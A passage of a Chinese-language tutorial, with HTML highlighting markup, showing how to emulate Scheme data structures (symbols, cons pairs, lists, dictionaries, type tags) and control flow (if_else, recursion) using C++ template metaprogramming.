class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="字符串"><strong>字符串</strong></h2><p>接下来是用模板类型来表示字符串。C++ 的模板参数只能是整数，不能是<code>const char*</code>。但是我们可以将字符串的字符分拆开，这样每个字符都是整数。</p><p>比如字符串 <code>hello</code> 对应于类型<code>String&lt;'h', 'e', 'l', 'l', 'o'&gt;</code>。</p><p>有些编程语言，会将实际上的字符串，再分拆成两种类型。</p><ul><li>符号(Symbol)</li><li>字符串(String)</li></ul><p>符号是不可修改的，放在全局唯一的符号表。要判断符号是否相同，只需要判断符号对应的指针或者索引是否相同。而字符串是可以被修改的。</p><p>Scheme 区分了符号和字符串。为跟 Scheme 对应（我们在用 C++ 模板来模拟Scheme），我们将在编译期不可变的字符串，叫做符号。符号的类型为</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> C<span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">Symbol</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">constexpr</span> <span class="token keyword">char</span> <span class="token keyword">const</span> value<span class="token punctuation">[</span><span class="token keyword">sizeof</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>C<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token char">'\0'</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>为了方便编写代码。提供了一个宏 <code>symbol</code></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">symbol</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span> <span class="token comment">// 生成 Symbol&lt;'h', 'e', 'l', 'l', 'o'&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="将基础类型组合起来"><strong>将基础类型组合起来</strong></h2><h2 id="cons"><strong>cons</strong></h2><p>有了基础类型，现在需要将基础类型组合起来。最简单的组合方式，就是将两个类型放在一起。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">U</span><span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">pair</span> <span class="token punctuation">{</span>    <span class="token keyword">using</span> car_ <span class="token operator">=</span> T<span class="token punctuation">;</span>    <span class="token keyword">using</span> cdr_ <span class="token operator">=</span> U<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个类型是 <code>car</code>，第二个类型是<code>cdr</code>。另外我们用 <code>cons</code>函数，将两个类型粘到一起。于是有</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">x</span><span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">car</span> <span class="token punctuation">{</span>    <span class="token keyword">using</span> type <span class="token operator">=</span> <span class="token keyword">typename</span> <span class="token class-name">x</span><span class="token double-colon punctuation">::</span>car_<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">x</span><span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">cdr</span> <span class="token punctuation">{</span>    <span class="token keyword">using</span> type <span class="token operator">=</span> <span class="token keyword">typename</span> <span class="token class-name">x</span><span class="token double-colon punctuation">::</span>cdr_<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">U</span><span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">cons</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token keyword">public</span> <span class="token class-name">pair</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token class-name">U</span><span class="token operator">&gt;</span></span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>car</code>、<code>cdr</code>、<code>cons</code> 都是 Scheme的叫法。现在就可以用 <code>cons</code>组合两个基本类型，也可以用<code>car</code> 或 <code>cdr</code> 访问类型</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">using</span> p <span class="token operator">=</span> cons<span class="token operator">&lt;</span>number<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> number<span class="token operator">&lt;</span><span class="token number">2</span><span class="token operator">&gt;&gt;</span><span class="token keyword">using</span> num1 <span class="token operator">=</span> car<span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">;</span><span class="token keyword">using</span> num2 <span class="token operator">=</span> cdr<span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>假如要组合三个类型，可以嵌套 <code>cons</code>。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">using</span> p <span class="token operator">=</span> cons<span class="token operator">&lt;</span>number<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> cons<span class="token operator">&lt;</span>number<span class="token operator">&lt;</span><span class="token number">2</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> number<span class="token operator">&lt;</span><span class="token number">3</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="list"><strong>list</strong></h2><p>现在我们用 <code>cons</code> 嵌套来表示线性结构，引入<code>list</code>。类似链表，将多个节点串连在一起。为达到这个目标，还需要引入一个结束类型。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">null</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>比如</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">using</span> lst0 <span class="token operator">=</span> list<span class="token operator">&lt;</span>number<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> number<span class="token operator">&lt;</span><span class="token number">2</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> number<span class="token operator">&lt;</span><span class="token number">3</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">;</span>  <span class="token comment">// 等价于下面</span><span class="token keyword">using</span> lst1 <span class="token operator">=</span> cons<span class="token operator">&lt;</span>number<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> cons<span class="token operator">&lt;</span>number<span class="token operator">&lt;</span><span class="token number">2</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> cons<span class="token operator">&lt;</span>number<span class="token operator">&lt;</span><span class="token number">3</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> null<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>list</code> 的实现使用了模板偏特化</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> T<span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">list</span><span class="token punctuation">;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">list</span><span class="token operator">&lt;</span>T<span class="token operator">&gt;</span> <span class="token operator">:</span> <span class="token keyword">public</span> pair<span class="token operator">&lt;</span>T<span class="token punctuation">,</span> null<span class="token operator">&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token keyword">typename</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> X<span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">list</span><span class="token operator">&lt;</span>T<span class="token punctuation">,</span> X<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&gt;</span> <span class="token operator">:</span> <span class="token keyword">public</span> pair<span class="token operator">&lt;</span>T<span class="token punctuation">,</span> list<span class="token operator">&lt;</span>X<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&gt;&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="字典"><strong>字典</strong></h2><p>好了，有了基本类型和 <code>list</code> 操作（其实是 <code>cons</code>的嵌套），我们就可以表达任意更高级的概念。比如字典</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">a: 1b: 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>就可以表达为</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">list<span class="token operator">&lt;</span><span class="token function">symbol</span><span class="token punctuation">(</span><span class="token string">"*table*"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    cons<span class="token operator">&lt;</span><span class="token function">symbol</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> number<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">,</span>    cons<span class="token operator">&lt;</span><span class="token function">symbol</span><span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> number<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="类型-tag"><strong>类型 tag</strong></h2><p>我们有了<code>number</code>、<code>symbol</code>、<code>null</code>、<code>pair</code>、<code>boolean</code>这些类型。现在我们想判断类型，比如有一些<code>is_null</code>、<code>is_number</code> 等实用函数。用于对应 Scheme的 <code>null?</code>、`<code>pair?</code> 等函数。</p><p>这可以用经典的模板编程技术 <code>traits</code>来解决。定义好一个tag，再在基本类型中嵌入 <code>tag</code>。比如</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">boolean_tag</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">bool</span> is_pair <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">bool</span> is_null <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">bool</span> is_number <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">bool</span> is_boolean <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">bool</span> is_symbol <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">number_tag</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">bool</span> is_pair <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">bool</span> is_null <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">bool</span> is_number <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">bool</span> is_boolean <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">bool</span> is_symbol <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">bool</span> flag<span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">boolean</span> <span class="token punctuation">{</span>    <span class="token keyword">using</span> tag <span class="token operator">=</span> boolean_tag<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">bool</span> value <span class="token operator">=</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">int64_t</span> N<span class="token punctuation">,</span> <span class="token keyword">int64_t</span> D <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">number</span> <span class="token punctuation">{</span>    <span class="token keyword">using</span> tag <span class="token operator">=</span> number_tag<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">int64_t</span> numer <span class="token operator">=</span> impl<span class="token double-colon punctuation">::</span>rat_reduce<span class="token operator">&lt;</span><span class="token punctuation">(</span>N <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> D <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> N<span class="token punctuation">,</span> D<span class="token operator">&gt;</span><span class="token double-colon punctuation">::</span>numer<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">int64_t</span> denom <span class="token operator">=</span> impl<span class="token double-colon punctuation">::</span>rat_reduce<span class="token operator">&lt;</span><span class="token punctuation">(</span>N <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> D <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> N<span class="token punctuation">,</span> D<span class="token operator">&gt;</span><span class="token double-colon punctuation">::</span>denom<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里 tag 就是类型标识。每个类型都有了 tag，就可以编写判断函数</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token operator">&gt;</span><span class="token keyword">using</span> is_null <span class="token operator">=</span> boolean<span class="token operator">&lt;</span>T<span class="token double-colon punctuation">::</span>tag<span class="token double-colon punctuation">::</span>is_null<span class="token operator">&gt;</span><span class="token punctuation">;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token operator">&gt;</span><span class="token keyword">using</span> is_pair <span class="token operator">=</span> boolean<span class="token operator">&lt;</span>T<span class="token double-colon punctuation">::</span>tag<span class="token double-colon punctuation">::</span>is_pair<span class="token operator">&gt;</span><span class="token punctuation">;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token operator">&gt;</span><span class="token keyword">using</span> is_number <span class="token operator">=</span> boolean<span class="token operator">&lt;</span>T<span class="token double-colon punctuation">::</span>tag<span class="token double-colon punctuation">::</span>is_number<span class="token operator">&gt;</span><span class="token punctuation">;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token operator">&gt;</span><span class="token keyword">using</span> is_boolean <span class="token operator">=</span> boolean<span class="token operator">&lt;</span>T<span class="token double-colon punctuation">::</span>tag<span class="token double-colon punctuation">::</span>is_boolean<span class="token operator">&gt;</span><span class="token punctuation">;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token operator">&gt;</span><span class="token keyword">using</span> is_symbol <span class="token operator">=</span> boolean<span class="token operator">&lt;</span>T<span class="token double-colon punctuation">::</span>tag<span class="token double-colon punctuation">::</span>is_symbol<span class="token operator">&gt;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="流程控制"><strong>流程控制</strong></h2><h2 id="顺序"><strong>顺序</strong></h2><p>顺序是是简单的，一个个写下去就行。比如</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">using</span> lst0 <span class="token operator">=</span> list<span class="token operator">&lt;</span>number<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> number<span class="token operator">&lt;</span><span class="token number">2</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> number<span class="token operator">&lt;</span><span class="token number">3</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">;</span><span class="token keyword">using</span> lst1 <span class="token operator">=</span> cons<span class="token operator">&lt;</span>number<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> cons<span class="token operator">&lt;</span>number<span class="token operator">&lt;</span><span class="token number">2</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> cons<span class="token operator">&lt;</span>number<span class="token operator">&lt;</span><span class="token number">3</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> null<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span><span class="token punctuation">;</span><span class="token generic-function"><span class="token function">display</span><span class="token generic class-name"><span class="token operator">&lt;</span>lst0<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token generic-function"><span class="token function">display</span><span class="token generic class-name"><span class="token operator">&lt;</span>lst1<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="分支"><strong>分支</strong></h2><p>在 C++ 模板中，分支使用偏特化来实现</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">Flag</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">True</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">False</span><span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">if_else_impl</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token keyword">public</span> <span class="token class-name">True</span></span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">True</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">False</span><span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">if_else_impl</span><span class="token operator">&lt;</span>boolean<span class="token operator">&lt;</span><span class="token boolean">false</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> True<span class="token punctuation">,</span> False<span class="token operator">&gt;</span> <span class="token operator">:</span> <span class="token keyword">public</span> False <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">Flag</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">True</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">False</span><span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">if_else</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token keyword">public</span> <span class="token class-name">if_else_impl</span><span class="token operator">&lt;</span><span class="token keyword">typename</span> Flag<span class="token double-colon punctuation">::</span><span class="token class-name">type</span><span class="token punctuation">,</span> <span class="token class-name">True</span><span class="token punctuation">,</span> <span class="token class-name">False</span><span class="token operator">&gt;</span></span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>if_else</code> 有三个参数，第一个是条件，条件成立就做<code>True</code> 分支，不成立就走 <code>False</code>分支。</p><h2 id="循环"><strong>循环</strong></h2><p>模板元编程，没有直接的循环语法。但我们可以用递归来实现。</p><h3 id="if_else-例子"><strong><code>if_else</code></strong><strong>例子</strong></h3><p>上面我们定义了 <code>list</code>, 但还不能操作<code>list</code>。现在我们已经有了分支和递归，可以编写一些函数。其中<code>length</code>计算 <code>list</code> 的长度，<code>list_ref</code>用于访问元素。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">items</span><span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">length</span> <span class="token punctuation">{</span>    <span class="token keyword">using</span> type <span class="token operator">=</span> <span class="token keyword">typename</span> <span class="token class-name">if_else</span><span class="token operator">&lt;</span>is_null<span class="token operator">&lt;</span>items<span class="token operator">&gt;</span><span class="token punctuation">,</span>                                  number<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">&gt;</span><span class="token punctuation">,</span>                                  add<span class="token operator">&lt;</span>number<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> length<span class="token operator">&lt;</span>cdr<span class="token operator">&lt;</span>items<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;&gt;</span><span class="token double-colon punctuation">::</span>type<span class="token punctuation">;</span>    <span class="token keyword">using</span> tag <span class="token operator">=</span> <span class="token keyword">typename</span> <span class="token class-name">type</span><span class="token double-colon punctuation">::</span>tag<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">items</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">n</span><span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">list_ref</span> <span class="token punctuation">{</span>    <span class="token keyword">using</span> type <span class="token operator">=</span> <span class="token keyword">typename</span> <span class="token class-name">if_else</span><span class="token operator">&lt;</span>is_equal<span class="token operator">&lt;</span>n<span class="token punctuation">,</span> number<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">,</span>                                  car<span class="token operator">&lt;</span>items<span class="token operator">&gt;</span><span class="token punctuation">,</span>                                  list_ref<span class="token operator">&lt;</span>cdr<span class="token operator">&lt;</span>items<span class="token operator">&gt;</span><span class="token punctuation">,</span> sub<span class="token operator">&lt;</span>n<span class="token punctuation">,</span> number<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;&gt;</span><span class="token double-colon punctuation">::</span>type<span class="token punctuation">;</span>    <span class="token keyword">using</span> tag <span class="token operator">=</span> <span class="token keyword">typename</span> <span class="token class-name">type</span><span class="token double-colon punctuation">::</span>tag<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的定义看起来很复杂的样子。但上面的模板代码，完全等价于下面的Scheme 代码</p><pre class="line-numbers language-scheme" data-language="scheme"><code class="language-scheme"><span class="token punctuation">(</span><span class="token keyword">define</span> <span class="token punctuation">(</span><span class="token builtin">list-ref</span> items n<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">=</span> n <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token punctuation">(</span><span class="token builtin">car</span> items<span class="token punctuation">)</span>      <span class="token punctuation">(</span><span class="token builtin">list-ref</span> <span class="token punctuation">(</span><span class="token builtin">cdr</span> items<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">-</span> n <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">define</span> <span class="token punctuation">(</span><span class="token builtin">length</span> items<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">null?</span> items<span class="token punctuation">)</span>      <span class="token number">0</span>      <span class="token punctuation">(</span><span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">(</span><span class="token builtin">length</span> <span class="token punctuation">(</span><span class="token builtin">cdr</span> items<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>来到这样，应该意识到，我们是用 C++ 的模板语法来写 Scheme。基本上Scheme 的任何代码，都可以按照这种方式改写。</p><p>拿 <code>struct length</code> 来说，其中类型名 <code>length</code>可以对应于 Scheme 的一个函数名。<code>typename items</code> 可以对应于Scheme 的函数参数。<code>using type</code>对应于函数返回结果。<code>using tag</code>是返回结果的类型。</p><h2 id="类型-type"><strong>类型 type</strong></h2><p>我们统一用 <code>T::type</code> 来获取返回结果。<code>T::tag</code>获取返回类型。为了达到这种统一，在所有的类型中，都定义 <code>type</code>和 <code>tag</code> 这两个字段。</p><p>特别地，在基础类型中，也添加 type 字段。于是基础类型，就演变成</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">int64_t</span> N<span class="token punctuation">,</span> <span class="token keyword">int64_t</span> D <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">number</span> <span class="token punctuation">{</span>    <span class="token keyword">using</span> type <span class="token operator">=</span> number<span class="token operator">&lt;</span>N<span class="token punctuation">,</span> D<span class="token operator">&gt;</span><span class="token punctuation">;</span>    <span class="token keyword">using</span> tag <span class="token operator">=</span> number_tag<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">int64_t</span> numer <span class="token operator">=</span> impl<span class="token double-colon punctuation">::</span>rat_reduce<span class="token operator">&lt;</span><span class="token punctuation">(</span>N <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> D <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> N<span class="token punctuation">,</span> D<span class="token operator">&gt;</span><span class="token double-colon punctuation">::</span>numer<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">int64_t</span> denom <span class="token operator">=</span> impl<span class="token double-colon punctuation">::</span>rat_reduce<span class="token operator">&lt;</span><span class="token punctuation">(</span>N <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> D <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> N<span class="token punctuation">,</span> D<span class="token operator">&gt;</span><span class="token double-colon punctuation">::</span>denom<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">bool</span> flag<span class="token operator">&gt;</span><span class="token keyword">struct</span> <span class="token class-name">boolean</span> <span class="token punctuation">{</span>    <span class="token keyword">using</span> tag <span class="token operator">=</span> boolean_tag<span class="token punctuation">;</span>    <span class="token keyword">using</span> type <span class="token operator">=</span> boolean<span class="token operator">&lt;</span>flag<span class="token operator">&gt;</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">bool</span> value <span class="token operator">=</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token 